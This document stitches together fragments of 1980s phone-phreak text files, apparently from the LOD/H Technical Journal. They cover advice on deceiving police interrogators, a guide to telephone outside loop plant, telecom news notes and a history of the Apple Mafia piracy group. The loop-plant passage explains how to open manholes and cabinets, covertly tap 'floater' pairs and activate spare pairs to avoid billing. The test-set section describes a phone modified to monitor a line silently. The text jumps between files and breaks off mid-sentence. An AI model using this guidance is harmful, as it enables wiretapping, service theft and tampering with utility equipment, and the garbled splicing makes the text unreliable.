exaggerating a psychological strength.      Exhibitionism   Showing off, bragging, etc.      Fear, Anger, Frustration, etc.  Of course when being interrogated, you should remain as emotionless as possible and never show anger, or get upset  NEVER inflict physical abuse upon the unsuspecting interrogator. This only creates tension between both the inter  rogator and yourself . Your every move, every response, every action is noted and used by the interrogator to get you to screw up and give him what he wants.  There can be two main objectives that you can obtain when being interrogated. The first is to find ways to force the interrogator to lose his initiative. You can do this in many ways. A few that come to mind are   Repeat everything the interrogator says. Mimic the interrogator. Laugh at the interrogator. Basically piss the interrogator off and make him so mad that he loses sight of his objective. This may however, get you in deeper trouble, but it may give you extra time while another interrogator is found.  Lie like hell to the interrogator and piss him off. Such as the pathological liar gimmick   I broke into the NSA's computer, yeah, and then used their network to get into the presidents private computer yeah that's it, the password was uh...Bonzo, yeah, and then used it to take control of a satellite used for Star Wars, and made it land right on top of the Kremlin, yeah that's the ticket!   You can also change the subject over and over again to totally unrelated things such as  its a nice day out today, hows the wife and kids, how about some food, who do you think is going to the superbowl, etc.  The other and probably better objective is simply to pretend to fall for any of the various techniques used against you and feed the interrogator more and more bullshit, of course being very sincere. This way he gets totally bogus information while thinking you are cooperating fully.  Well, I hope you never have to put this article to use in a legal manner, but you would be surprised how everyday you are interrogated without even realizing it by normal people who probably don't realize they are interrogating you!

These facilities include all wire, cable, and terminal points along the distribution path.  In this article, we shall follow this path from the CO to the subscriber, examining in depth each major point along the route and how it is used. This is especially useful for checking if any 'unauthorized equipment' is attached to your line, which would not be attached at the Central Office. I suppose this article can also be interpreted to allow someone to do just the opposite of its intended purpose...          Note that this article is intended as a reference guide for use by persons familiar with the basics of either LMOS MLT or the operation of the ARSB CRAS  or hopefully both , because several references will be made to information pertaining to the above systems bureaus. I have no manuals on this topic, all information has been obtained through practical experience and social engineering.                                                                                   Serving Area Concepts  SAC  plan                                           In order to standardize the way loop distribution plants are set up in the Bell System of the U.S.  and to prevent chaos , a reference standard design was created.  For urban and suburban areas, this plan was called the Serving Area Concepts  SAC  plan.  Basically, in the SAC plan, each city is divided into one or more Wire Centers  WC  which are each handled by a local central office switch.  A typical WC will handle 41,000 subscriber lines. Each WC is divided into about 10 or so Serving Areas  depending on the size and population of the city , with an average size of 12 square miles each  compare this to the RAND  Rural Area Network Design  plan where often a rural Serving Area may cover 130 square miles with only a fraction of the number of lines .  Each Serving Area may handle around 500 1000 lines or more for maybe 200 400 hous  ing units  typically a tract of homes .         From the CO, a feeder group goes out to each Serving Area.  This con  sists of cable s  which contain the wire pairs for each line in the SA, and it is almost always underground  unless it is physically impossible . These feeder cables surface at a point called the Serving Area Interface  SAI  in a pedestal cabinet  or  box  .  From the SAI, the pairs  or individual phone lines  are crossed over into one or several distribution cables which handle different sections of the SA  ie. certain streets .  These distribution cables are either of the aerial or underground type.  The modern trend is to use buried distribution cables all the way to the subscriber premises, but there are still a very large number of existing loop plants using aerial distribu  tion cables  which we will concentrate mainly upon in this article .  These distribution cables are then split up into residence aerial drop wires  one per phone line  at a pole closure  in aerial plant , or at a cable pair to service wire cross box  in buried plant .  The cable pairs then end up at the station protector at the customer's premises, where they are spliced into the premise  inside wire   IW  which services each phone in the customer's premi  ses  and is also the customer's responsibility .         Although this is the  standard  design, it is by no means the only one!  Every telco makes it's own modifications to this standard, depending on the geographic area or age of the network, so it's good to keep your eyes and your mind open.                                                  At this point, we will detail each point along the Loop Distribution Plant.                                Cable Facility F1   CO Feeder                                        The F1 cable is the feeder cable which originates at the Main Distribu  tion Frame  MDF  and cable vault at the local CO and terminates at the SAI. This cable can contain from 600 to over 2000 pairs, and often more than one physical F1 cable is needed to service a single Serving Area  at an SAI . The F1 is almost always located underground, because the size, weight, and number of feeders leaving the CO makes it impossible to put them on normal telephone poles.  Since is is also impractical to use one single piece of cable, the F1 usually consists of several pieces of large, pressurized or armored cable spliced together underground  this will be covered later  into a single cable.  Cable Numbering                          In order to make locating cables and pairs easier  or possible, for that matter , all of the cables in the loop distribution plant are numbered, and these numbers are stored in databases such as LMOS at the ARSB or other records at the LAC  Loop Assignment Center  or maintenance center. When trying to locate someone's cable pair, it helps a great deal to know these numbers  although it can be done without them with experience and careful observa  tion .  Probably the most common place to find these numbers is on a BOR, in the  Cable   Assignment Data  block.  The F1 is usually assigned a number from 00 to 99  although 000 999 is sometimes used in large offices .  Cable  pair  numbering is different however, especially in older offices  typical F1 pair numbers range from 0000 to 9999.  Keep in mind that the pair number is not concrete    it is merely nominal, it can change, and it doesn't necessarily have any special meaning  in some well organized offices, however, the cables and pairs may be arranged in a certain way where you can determine what area it serves by its number  such as in my area...heh heh   in any case, it's up to you to figure out your area's layout .  Anyway, the cable pair number is usually written in a format such as 02 1495, where 02 is the cable and 1495 is the pair  incidentally, since this is the CO Feeder cable pair that is connect  ed to the MDF, it is the one that will be listed in COSMOS .  F1 Access Points                           Although the F1 is run underground, there is really not a standard access point down there where a certain pair in a cable can be singled out and accessed  as will be explained next .  There is, however, a point above ground where all the pairs in the F1 can be accessed    this point is known as the Serving Area Interface  SAI , and it will be detailed later.  In LMOS or other assignment records, the address of the SAI will be listed as the TErminal Address  TEA  for the F1 cable handling a certain pair in question  therefore, it is where facility F1 stops.                     Underground Plant                            The term  Underground Plant  refers to any facilities located below the surface of the earth  this includes truly  buried  cables, which are located 6 or so feet underground surrounded basically by a conduit and dirt, as well as cables placed in underground cement tunnels along with other  below ground  equipment  such as seen in most urban areas .  Whereas the first type is really impossible to access  unless, of course, you want to dig for a day or so and then hack into an armored, jelly filled PIC cable    then you should take a bit of advice from our resident Icky PIC  Goo  advisor, The Marauder , the latter type can be accessed through manholes which lead to the underground tunnel.  Manholes                   Bell System manholes are usually found along a main street or area where a feeder cable group passes through.  Using an underground cable location map is the best method for locating cable paths and manhole appear  ances, although it may not always be available.  These maps can be acquired from the Underground Service Alert  USA   at 800 422 4133 , but often a  cable locator  will be dispatched instead  usually he will just mark off how far down or where you can dig without hitting a cable , so this is not a very practical method.  Of course, you can always follow the warning signs on telephone poles   call before you dig , etc  and the spans between SAI bridging heads until you find a manhole.  The F1 for the SAI nearest the manhole should be found down there along with others en route to the areas they serve.         There are several types of manhole covers, both round and rectangular. The rectangular ones are sometimes just hinged metal plates covering an under  ground terminal or cable closure, and these are easily opened by one person. A non hinged one may require two people.  Round manhole covers  which, by the way, are round so that a lineman can't accidentally drop the cover down the hole  are basically all the same, except for the types known as  C  and  D  type manhole covers which utilize locking bolts  these can be removed using a standard crescent or hex socket wrench .  These covers are the same as the order.  This is aided even further by the fact that since F1's usually last longer than F2 facilities, there are often more spare provisional F2 facili  ties in the loop plant  ie. 100 feeders in, 300 F2 out  200 aren't cross  connected to F1's  . So there is a good chance that you will find one that is distributed to your area.  Other spare facilities include  floaters , which are like spare feeder pairs, except they are ACTIVE lines.  Often, a telco will extend whole feeder groups to more than one SAI in provision for future expan  sion, including active cable pairs.  If you find a working pair on a feeder panel which is not cross connected to a distribution pair, that pair is a floater.  This is by far the best way to covertly access a certain pair, because most linemen will probably not be aware of the pair's presence  it looks unused on the surface .  Beware! If you think you can hook up to someone's floater and get free service, you're probably wrong  so many other people have been wrong, in fact, that Pacific Bell has a special  Form K 33  to report this type of fraud , because the telco is more aware of this than you may think.  Obviously any toll call you make will show up on the bill for that line.  A do it yourself spare pair activation can avoid this problem, if done correctly.                                                  End of First half, attach second half here.  The LOD H Technical Journal  File  9 of 12       Second half of The Outside Loop Distribution Plant starts here.                                        Cable Facility F2   Distribution                                           The F2 distribution cable is the cable which originates from the F1 feeder in the SAI and distributes individual cable pairs to each subscriber. This cable can be one of two types  aerial or buried.  The most common is the aerial distribution cable, although buried cable is the modern trend.  In the case of aerial F2, the cable or cables leave the SAI underground, and at the first telephone pole on the distribution span, the cable is routed up the pole. It then is suspended on the span, such as down a street, and at each group of houses there is a terminal on the span. This terminal is the aerial drop split  ter, and it's purpose is to break off several pairs from the distribution cable in order to distribute them  in the form of aerial drop wires  to each house or premise.  The location or address of the premise nearest this aerial drop splitter is the TErminal Address of the F2 serving a certain pair  each group of pairs in the F2 will have it's own terminal address, unlike the one address for the F1 terminal  SAI  .  The F2 cable is always the lowest cable on the telephone pole, and it is usually a great deal larger than the electric power distribution cables above it.  Often more than one F2 can be seen on a single pole span.  In this case, the top F2 will usually be the one which is being distributed to the subscribers on that street, and the lower  and most often larger  cables are other F2's coming from an SAI and going to the streets which they service   These cables consist of multiple spliced spans, and they will not have any drop wires coming off them  they are marked every few poles or so at a splicing point called a  bullet closure  which is fully enclosed and can be quite large  ie. 6  dia, 20  long  as compared to the normal drop splitters  ie. or similar 4 w x 5 h x 12 l     these closures are clamp press  urized and are not meant to be opened unless the cable is being replaced or splicing work is being done.  They are not standard cable pair access points .         Buried F2 plant is similar to aerial, except that the cable is not visible because it is underground.  Instead of going to a pole from the SAI, the cable continues underground.  The drop wires are also underground, and the method of breaking them from the distribution cable is similar to that of the aerial drop splitter, except it is a small pedestal or box located on the ground near the houses it serves.  This address closest to this pedestal is the TEA for the F2.  F2 Cable Numbering                             The F2 distribution cable is usually given a 4 or 5 digit number, depending on the office.  The first 2 or 3 digits should be the number of the F1 that the F2 was branched off of, and the last 2 or 3 digits identify the distribution cable. Example         F1   Cable                   F2   Cable              25                          2531        This F2 cable came from feeder  25            The cable  pair  numbers may be set in a similar way, with the last 3 or 4 digits identifying the pair, and the first digit  usually a 1  identifying the pair as a feeder or a distribution pair. Example          F1   Cable    Pair            F2   Cable    Pair              25     1748                  2531     748                        signifies F1  feeder  cable pair          Generally, the F1 cable pairs are numbered higher than the F2 cable pairs, due to the fact that a feeder cable may contain several distribution cables' worth of cable pairs.  Note once again that all of this numbering plan is the STANDARD, and it may be far from real life!  As soon as one dist  ribution pair is replaced, crossed over to another feeder pair, or taken from service, the set order is interrupted.  In real life, it is most always nece  ssary to get both F1 and F2 cable assignment data.                                                                                               Facilities F3 F5, Rural Area Interface  RAI                                                        Although cable facilities F3, F4, and F5 may be specified in any loop plant, they are rarely seen anywhere except in rural areas under the RAND plan  Rural Area Network Design .  Basically, plants using these extra facilities are similar to F1 F2 plants, except there are extra cable spans and or terminals in the path.  When locating cables, the highest numbered facility will be at the end of the path, terminating near the subscriber's end  like a  normal  F2 , and the lowest numbered facility will be the feeder from the CO  like a  normal  F1 .  The extra spans will be somewhere in between, like an intermediate feeder or extra distribution cable with separate cable access terminals.  One such facility is the Rural Area Interface  RAI , which can be used in a  feeder in, feeder out  arrangement.  This is usually seen on cable routes of 50 pairs or greater, with a length of longer than 30 kft  about 6 miles .  In this case, there will be two terminal cabinets in the feeder path, labelled RAI A and RAI B.  The RAI A is special because it has a two part terminal block   the top has switching panels with 108 type connectors which cross connect feeder in and feeder out pairs using jumper plugs, and the bottom has standard 76 type binding posts which cross connect feeders to distribution cables for subscribers in the local area of the RAI A.  The jumper plugs can only be connected in one way to the switching panels, so random cross connection of feeder in feeder out pairs is prevented. In this way, the cable and pair numbers stay the same as if the feeder cable was uninterrupted. This is used a lot in rural areas  it allows part of a feeder group to be split off at the RAI A like a distribution cable near a town along the route, and the rest of the feeder group continues on to a town further away, to the RAI B where it is terminated as in a  normal  SAI.  In order to access a pair, just use the last RAI in the span  whichever it is  and treat it just like an SAI. If the pair terminates at RAI B, you can also access it at RAI A!  if you can locate the pair using color code, BP number, or  ughh  ANI, there should be test terminals on top of the jumper plugs connecting the 108's on the switching panel where you can hook your test set    you can't hook onto a raw 108 connector very easily .  Anyway, the RAI terminal is usually a ground pedestal with a cabinet such as a 40 type, but it can be aerial mounted on a pole  hard to access .  Pair Gain, Carried Derived Feeder                                            Another common facility in rural areas  and in cities or suburbs, es  pecially near large housing complexes, etc.  is the pair gain system.  It is basically a system which consists of a digital link which is distributed, almost like a normal cable pair, out to a terminal cabinet called a Remote Terminal  RT  which contains equipment which demultiplexes the digital line into many  normal  metallic analog telephone lines which go to each subscriber in the area.  Because the digital line can transmit the audio from several separate lines and multiplex them onto one cable, only one special cable pair is needed to come from the CO as a feeder, instead of several separate ones  this is why it is called a  pair gain  system.  The remote terminal  RT  contains both the demultiplexing electronics as well as a small  SAI  type terminal block for connecting the pairs to distribution cables on the side of the path toward the subscriber.  Because the  feeder  is not a multipair cable but a digital link  ie. T carrier , this arrangement is known as a  carrier derived feeder.   The SAI part of the RT is used just like a normal SAI on the distribution side  BLUE , but the feeder side will be slightly different.  Carrier derived feeders are always marked with YELLOW labels, and their pairs will be crossed over to distribution cables just like in an SAI. So, in order to access a pair in a system like this, you must do so on the DISTRIBUTION side, because you can't hook an analog test set to a 1.544 Mbps digital T carrier line!  or worse yet, a fiber optic cable .  This may be difficult, because these cabinets are always locked  with few exceptions , so you'll have to find a terminal closer to the subscriber    also be aware that many RT's are equipped with silent intrusion alarms.  Anyway, some common pair gain systems are the Western Electric SLC 8, 40, 96, and GTE's MXU, ranging in size from 8 to over 96 lines.  RT cabinets can often be identified by the ventillation grilles  with or without a fan inside  which are not present on SAI's or other non RT cabinets.                                                                                     Aerial Distribution Splice Closure,        Drop Wire Splitter                                              This terminal is the point where the individual cable pair for a certain subscriber is split from the F2 distribution cable and spliced onto an aerial drop or  messenger  wire which goes to the subscriber's premises. In an aerial distribution plant, 2 types of this terminal are common   1  Western Electric 49 type Ready Access Closure   Cable Terminal  2  Western Electric 53A4, N type Pole Mount Cable Terminals                   Type 1   The 49 type, 1A1, 1B1, and 1C1 closures are all functionally similar.          This terminal is a semi rectangular closure, about 15 L x 3 W x 5 H,          usually black, which is connected directly to the aerial cable itself           it is coaxial with the cable, so the cable passes straight through it.          It splits up to 12 pairs from the distribution cable to a small bin           ding post terminal block inside the closure.  Aerial drop wires are          then connected to these binding posts, and the wires exit the term           inal through holes on the bottom.  These wires are strung via strain          relief clamps on the pole down to the subscriber's site.  The terminal          closure is opened by pulling out and lifting either the whole cover          or the front panel after removing the cover fasteners on the bottom          and or the sides  the closure is a thick neoprene cover over an alum           inum frame .  Inside the case, there is a terminal block and there          may be some sort of loading coil as well.  The cable and this coil are          not openable, but the terminal block is.  Since the F2 pair terminates          in this closure, the F2 BP number  cable assignment data  corresponds          to a binding post on this terminal block.  As mentioned earlier, this          terminal will also contain spare pairs, in case a subscriber wants          another line.  In order to use one of these pairs, you must either get          an F2  and then F1  CP number from LAC using the BP, or you can put a          trace tone on the pair at the aerial closure and then locate the pair          at the SAI.  Then a cross connect would have to be made to an active          F1 pair, and a drop wire  ughh  would have to be added back at the          aerial closure.  Anyway, both the binding posts as well as the holes           inside   out  are numbered left to right, so you may not even have          to open the closure if you are just looking for an F2 BP number             just trace the drop wire from the house into the numbered hole on the          closure. The TErminal Address for the F2 is the address of the house          or premise closest to the pole near this closure.  These terminals           esp. 1A1, etc  are also used for straight and branch splices for          aerial cables, so you may see one cable in   two out   also, the          closure can be used for splicing only, so there may not be drop wires           in this case, it wont be listed in LMOS because it is not a terminal          point .  There is generally one of these every pole near a quad of          houses or so, mounted on the cable about an arm's length from the          pole.  Type 2   Both the 53A4 and the N type terminals serve the same function as          the 49 type just described, except they are used in situations where          there are more than 4 houses  8 lines, including provisional pairs .          This terminal is mounted directly on the pole, about a foot down from          the aerial cable.  It is not connected in line with the cable, so          there is no F2 splicing area in the cabinet  rather, a cable stub          comes from the terminal block and is spliced onto the span close to          where it touches the pole . It is about 22 H x 9 W x 4 D, rectan           gular, and silver  unpainted .  The door is similar to that of a 40           type cabinet, but it's much smaller  it is opened using a 7 16  tool          in the same manner as before, except that the door must be lifted          before it can be opened or closed.  In this way, the door slides down          on it's hinges when opened, so it locks in the open position and you          wont have to worry about it  especially nice because hanging onto a          pole is enough of a problem .  The terminal block can handle from 25          to 50 pairs, with 32 holes in the back for aerial drop wires.  Just          as in the Ready Access Closure, this is the F2 terminal, and the          numbered binding posts and holes correspond to F2 BP numbers.  The          TEA will be the address nearest the terminal  just as before .  This          terminal is common at the first pole on a street, on cul de sacs,          apartments, marinas   harbors, or anywhere there are many drop wires.  Buried Distribution Cross Box and Other Pedestals                                                            This terminal serves the same function as the aerial closures, except it is used in areas with a buried distribution plant.  This cable assignment for this terminal will be the F2 terminal, and the BP numbers and TEA will be the same as for the aerial terminals.  Probably the most common cross boxes are the PC4,6, and 12  these are around 50  tall by 4, 6, or 12  square respec  tively, and they are painted gray green like SAI cabinets.  These are the smallest pedestals in the distribution plant, and they don't have doors  they look like waist high square poles .  In order to open one of these pedestals, the two bolts on either side half way down the pedestal must be loosened with a 7 16 hex wrench  then the front cover can be lifted up, out, and off the rest of the closure.  These terminals are located generally near small groups of houses  up to about 12 lines usually  on the ground, often near other utility cabinets  such as electric power transformers, etc .  These are becoming more common as the new housing tracts use buried distribution plant. The F2 cable will enter as a cable stub, and it is split into service wires which go back underground to the subscribers.         All small pedestals are not necessarily the above type of terminal  these pedestal closures are often used for other purposes, such as splicing points in underground distribution, loading coil mounting, and even used as temporary wire storage containers.  If the terminal contains a terminal block or it is a significant point on the line, however, it will be listed in LMOS.  An example of this is a distribution path found by Mark Tabas in a Mountain Bell area     there was a small PC12 type closure on the ground near a street in a remote suburb, and it was serving as a terminal point for a whole F1 cable.  It was listed as the F1 terminal, and it was at the right TEA  however, there was no terminal block because it was a splicing point  just a bunch of pairs connected with Scotchlok plastic connectors which are hung on a bar in the pedestal closure , so LMOS had no BP number.  Instead, a color code was listed  see appendix  for the pair in the splice.  Anyway, the WHOLE F1 went up to an N type closure on a pole and was split into drop wires.                                         Multi Line Building Entrance Terminals                                                 This terminal takes the aerial drop or service wires and cross connects them over to the Inside Wire  IW  in the subscriber's building  hotels, busi  nesses, etc .  There are many different types of terminal blocks for this terminal, although by far the most common is the Western Electric 66 block. The 66 type terminal uses a block of metal clips  the wire is pushed onto the clip with a punch down tool which also strips the wire.  The block is divided into horizontal rows which can have from 2 to over 6 clips each.  Since each row group terminates one pair, two rows are needed for x connect, one on top of the other.  The service or drop wire usually enters on the left, and the inside wire is connected to the far right.  In order to locate a pair, usually you can visually trace either the service wire or the inside wire to the block, and often the inside wire side wil be numbered or labelled with an address, phone number, etc.  It is also possible for this terminal to serve as an F2 terminal point, if there are a lot of lines.  In this case, LMOS will list the TEA usually with some physical direction as to where to find it. The left side will then be numbered as F2 BP's. This terminal is also the demarca  tion point which separates the customer's equipment from the telco's.  The new terminals often have an RJ 21 connector on the service wire side, such as a 25 pair for PABX or a Bell 1A2 Key, etc.  There are also  maintenance termina  ting units   MTU  which are electronic units connected to the line s  at the entrance protector  these are sometimes seen in some telcos.  Basically, they provide functions such as party ANI on multi party lines, remote disconnect  for testing or  click!  non payment , or half ringers  the most common    they prevent ringing continuity failures on switches like ESS when there are no phones hooked to the line when it rings .  MTU terminals are often locked.  Single Pair Station Protector                                        There's really not much to say about this terminal.  Basically, it takes the service or drop wire and connects it to the inside wire in a single line residence  houses with 2 lines will have 2 of these .  These are at every house on an outside wall or basement, and there are two main types  the Western Electric 123  with a  150 type  rubber cover , and the old WE 305 and new AT T 200 Network interface  metal and plastic, respectively . These terminals have one binding post pair and they will have either gas discharge tubes or carbon blocks to protect the line from lightning or excess current.  Obviously, there is no BP number  you just have to visually trace the drop wire to find the protector . This is also the demarcation point marking the end of the telco's responsibility, as well as the end of our tour.

Use that number to find                                      the Tip color, and the remainder to find  01 05           White      Blue    the Ring color  remainder 0   Slate .  06 10           Red        Orange   e.g. Pair  1   White Brown, Pair  14    11 15           Black      Green    Black Brown, Pair  24   Violet Brown .  16 20           Yellow     Brown  21 25           Violet     Slate  Usually if a color code is needed  such as in a splice case  you can get it from LAC or the testboard  if it's really essential, it will be in LMOS as well.  This color code is also used a lot on cable ties  usually with white stripes and ring colors only , although these are often used randomly.            Test Sets                   This is the  right hand  of both the professional and the amatuer lineman.  Basically, it is a customized portable telephone which is designed to be hooked onto raw cable terminals in the field and used to monitor the line, talk, or dial out.  The monitor function is usually the main difference between the  butt in  test set and the normal phone.  If you don't have a real test set already, the following circuit can convert a normal  4 made in  taiwan phone into a working test set.  The  all in one  handset units without bases are the best  I tend to like QUIK's and GTE Flip Phone II's .

You will be able to dial out and receive calls.  When the SPST is opened, the resistor and capacitor are no longer shunted, and they become part of the telephone circuit.  When you lift the switchhook on the test set, you will not receive dial tone, due to the fact that the cap blocks DC, and the resistor passes less than 4 mA nominally  far below the amount necessary to saturate the supervisory ferrod on ESS or close the line relay on any other switch .  However, you will be able to silently monitor all audio on the line.  The cap reactance   the phone's impedance insure that you won't cut the signal too much on the phone line, which might cause a noticeable change  ..expedite the shock force, SOMEONE'S ON MY LINE!! . It's also good to have a VOM handy when working outside to rapidly check for active lines or supervision states.

Legion Of Hackers              Contributors        Lex Luthor   Gary Seven  LOH      The LOD H Technical Journal  File  12 of 12                                Network News   Notes                                                                                   ISDN passes first real world test  ComputerWorld, Nov. 24th, 1986        After at least five years development work and prototyping on vendors' premises, the first operational Integrated Services Digital Network involving customer premises equipment was successfully tested.       In two initial tests, Arizona government officials transmitted both voice and data between their offices through a Northern Telecom, ISDN digital switch residing on Mountain Bell's Phoenix Central Office.       The trial offers participating vendors the opportunity  to evaluate ISDN technology and determine customer benefits outside the research lab . Customer premises equipment used in the trial is still in the prototype phase, however. No time frames for introducing commercial offerings were discussed.       In the first of two ISDN applications demonstrated at a news conference, Don Cline, Mountain Bell's Arizona VP and CEO, placed a five minute voice call at the Phoenix Civic Plaza to Arizona Secretary of State Rose Mofford and simultaneously transmitted a certificate commemorating the event.  The transmissions were handled by Northern Telecom's Meridian digital telephone sets and workstations and passed through a Northern Telecom DMS 100 ISDN switch as Mountain Bell's Phoenix CO.       In the second ISDN application an NCR  PC was used to access and alter a driver's record residing on an Amdahl 5850 host in the Motor Vehicles Division from two blocks away.       Sending both voice and data in digital form over the same twisted pair telephone wiring is more reliable than analog communications and in the long run will save a lot of money. Workstations linked over an ISDN basic interface can be moved as easily as you can move telephones, as opposed to having to restring coaxial cable.                                                                                   Long awaited McDonald's ISDN trial to start in two weeks  ComputerWorld 12 1        During the second user site ISDN trial, scheduled to begin Dec. 16, at least four rival communications equipment vendors will test whether their terminal interfaces conform closely enough to the telecommunications standard to communicate.       McDonalds's Corp, agreed more than two years ago to participate in the trial, which is sponsored by Ameritech divested BOC Illinois Bell, because the fast food giant wanted the emerging technology for its own use.       Slated to continue at least through early 1988, the trial ISDN network will link a variety of workstations and hosts at McDonalds headquarters located in Oak Brook, Ill., through a Northern Telecom DMS 100 ISDN switch residing at Illinois Bell's CO.       The company will start with 50 basic rate digital subscriber lines and gradually ramp up to a projected 300 to 400 lines by the end of 1987. The basic interface defines two 64K bit sec B channels and a separate 16K bit sec D channel to carry data packets and signaling information.       All the products used in the trial are designed to communicate with AT T's 5ESS switch. While the basic ISDN interface is sufficiently well defined to permit different vendor's implementations to communicate, different vendors' CO switch products still retain software incompatibilities.       The way terminal adapters communicate via ISDN is still defined by the CO switch, terminals can be modified to communicate with either AT T's or Northern Telecom's ISDN switch, but you can't just unplug a terminal and move it from one switch to the other.       Originally slated to be the first ISDN trail to begin operations, the project was delayed for approximately a month while AT T finished implementing software on the 5ESS ISDN switch at Illinois Bell's CO. While the hardware used in AT T's ISDN switch is commercial, the software is coming slowly.                                                                                   Growth forces split in 305 area code       Southern Bell announced that rapid growth will force them to split the 305 area code in two, with Broward, Dade, and Monroe counties remaining 305 and Palm Beach County to Orlando becoming 407.  If we didn't make the split we'd literally run out of phone numbers .       The split is slated to take place in April 1988, making 407 Florida's fourth area code and the first new one in 23 years.            617 currently with 533 exchanges will be splitting off into 508 in 1988.   303 will be split with Denver remaining 303 and 719 will cover Colorado Springs.  This leaves the following NPA's open  708, 903, 908, 909, 917 not including X10 where X is 4,6,7,8, and 9.                                                                                     Secret Service Buys Telenet Network  Communications Week        US Sprint Communications Corp's Telenet Communications Corp subsidiary has signed a  35 million multiyear contract to build a private data network for the US Secret Service.       The contract marks Telenet's first major private network coup in the highly competitive market of sensitive government communications. While telenet would not reveal the extensiveness of the network or its applications, the Secret Service acknowledges having 4,300 employees and about 100 locations in the United States.       Data transmission plays a significant role in the Secret Service's mandate, which beyond guarding the president includes the investigation of counterfeiting, securities and electronic funds transfer violations and credit card fraud.       Encryption or other security measures are expected to be employed in the new system, but telenet does not provide those functions.       In addition to its public network, Telenet has sold about 70 private networks, about 100 hybrid networks using public and private capabilities, and many hundreds of virtual private networks.       It will take more than a year to complete construction.                                                                                        New Social Security Net  Communications News        The US Social Security Administration will install new modems and diagnostic and control systems as part of a program to establish its Data Communications Utility Network, which covers 1500 offices in the US.       The new network will handle interactive Social Security claims processing. Equipment for this phase is being provided by Racal Milgo in an  11 million contract.                                                                                   Allnet extends southward with big capacity purchase  Communications News        Through the purchase of capacity from three providers, Allnet Communications Corporation has added 4,000 miles of fiber optic route to its network.       In a  36 million deal, the company purchased capacity, in the southeastern US from Microtel, SouthernNet and Southland FiberNet. All three are members of the National Telecommunications Network.                                                                                   Southern Cal to link 11,000 users on net  Communications News        The University of Southern California is in the process of establishing a  21.8 million University Communications Network that will link more than 11,000 users throughout 185 buildings.       Voice and data will be transmitted over the network, which will use an AT T System 85 PBX, a system of local area networks, and an intercampus microwave network.       Approximately 12 miles of fiber optic cable will be used to link 21 USC schools. The system will include 10 Information System Networks and 504 Starlan networks.       The telecommunications project is scheduled for completion in March of 1988.                                                                                  Dallas to use Cell System  Communications News        The city of Dallas has begun a  2.9 million program to outfit personnel in various city departments with mobile cell roaming data communications systems. The network will consist of 545 Mobile Data International MDI 9031 mobile data terminals with the 8020 integral data radio, 20 6000 series hand held portable data terminals, related base equipment and automatic zone transfer between six calls using 11 radio frequencies with frequent re use.       Full roaming between the cell sites will be handled on a transparent basis to the operator.                                                                                   Singapore in Net Upgrade  Communications News        The Republic of Singapore will install two digital international gateway exchanges as part of a total network upgrade program.       The Telecommunications Authority of Singapore and AT T International will provide AT T's 5ESS digital switch.  The company said this is the first application of the 5ESS as an international switching point.       The first switch will be handed to the authority in April of 1988 and the second in April of 1989.

Untouchables, Apple Mafia, Dirty Dozen   I won't get into the other two, because there already is  The Untouchables  story, and I'm not qualified to make comments about the Dirty Dozen.  Everything in this file is fact. I grew up in Queens NY  now 718 . Where many  of the  original  pirates and phreaks, were from. Many of the readers will question certain aspects of this file, or my authority to write it. But they are always more than welcome to go to the sources themselves and find the truth is what I am writing.                                                                                   To begin with, I'm now 22 and going to college. I have been out of the  wares world  for the better part of 2 years. What prompted me to write this is a  younger friend of mine, who is now a  pirate  and spends his life calling all the boards, and getting all the wares  Not making fun of anyone, I went  through the same phase when I started, but it was very different from the  pirates world of today . About a week ago he told me about the  Apple Mafia  regrouping. I said bullshit. And I was right. He gave me some of the files on discussions now going on about the  new   apple mafia  and I must say it's pretty sad.   I felt the real story of what went on should be told, so here it is.   One more thing before I start. I was never in the Apple Mafia, or any of the other groups mentioned here. I never had that deep an interest in computers as anything but game machines or better typewriters. But I grew up in close proximety to many of the people involved, and spent time with them in other areas besides computers.                                                                                   From the messages posted about the controversy I have seen. I think it might be best to go through them 1 by 1. So here's the first one    Buffer of msg's. Untouched by me, except the conversion from 40 to 80 cols.                                                                                    To The Fake Apple Mafia                 From Disk Rigger  You are definatly not the real Apple Mafia. It was a popular group a while ago. It incluted Bioc Agent 003, Tuc, Hight Technology, Creative Cracker and a few others. I will inform them of you losers using there names and you will be ragged out of your minds. I would recomend you changed your group name or you will feel the wrath of Bioc! This is serious and you losers can keep your unoriginal name but You will pay for it.    Someone's reply.    Disk Digger  Get a life dude. The Apple Mafia is OVER. BIOC Agent was thrown out of the Apple Mafia. The final members were Tuc, Lord Digital, Creative Cracker, High Technology, Big Brother the Phantom, Silicon Scorpion,    Sherlock Apple. Nobody is going to Feel the wrath of Bioc  hahahahahhahahahahha . because 1. he quit the phreak pirate world over a year ago. 2. if he WAS around he wouldnt give a shit. 3. The old members who are still around probably care even less.    Someone elses reply.      While the new  apple mafia   get a life you fuckups. you might as well call yourselves the Untouchables.  are idiots. new warez r0dentz who sure as hell weren't around when the REAL apple mafia was around, are even bigger r0dents. This means YOU disk digger. Naming yourself after a program used to pack new wherez. get a life you fat fuckup. And if the people in the apple mafia knew YOU were throwing their names around on a fucking catfur, YOU are the one they would be mad at.    FUckup                                                                                   Despite incorrect statements in both parties messeges, this seems like a good time to point out that Bioc Agent was never in the Apple Mafia to begin with. The members changed through time, but Bioc was never a member.  More on him at a later time  The Final members were   If you doubt this, then boot up any ware cracked by them in 84 85.

Sherwood Forest .... Used to be run by High Tech. About 2 3 years ago. Sherwood Forest      The later Sherwood forest run by High tech. when he moved. Sherwood Forest      Ran by Creative Cracker, a good friend of High tech.   and no they were not feds, they just got a little carried away with the way they were running thier boards by letting just about anyone access most of the phreak sections that they had on line. The Treasury dept. finally closed them down along with cryton and some other un heard of hack boards.   If you have any questions feel free to ask.. I was going to run thier number 4 board, but shortly after I was offered the opurtunity they went under...                                                                                    I don't know where these msg's are from, or who these people are. But almost everything said in them is wrong.   I heard 2 guys were doing all the work, so they quit . Whoever said that has obviously read the 1984 loserlist, because that is a verbatim quote from it. Not only is it wrong in slandering everyone from Apple Bandit, Hot Rod, and Wombat Gonif, to Bioc Agent, Lord Digital and Paul Muad'Dib. But it's written in a such a ridiculous fashion, that any points the author was trying to make are lost in the jumble  For those who care it was written by  The Atom  .  Sherwood Forests  The last grand adventure .  The FIRST Sherwood Forest was started in 1979 by Magnetic Surfer. The only people who were on it back then, and still recognized would be Mr. Xerox and Lord Digital. Other members included Nickie Halflinger, Captain Crunch, Napoleon Bonaparte, and many others, whose names are probably meaningless to the people around today.  There was a 20 page write up on  Hackers , before it was in vogue to write  about them  Before WarGames and the 414 busts , In a 1982 issue of  California  magazine. Which detailed the bust of Ron Austin, who was at the time of arrest 22 years old and being tried for everything from credit card fraud, to grand theft. Also included in the article was a write up on Hacker bbs systems he was on and people he knew. 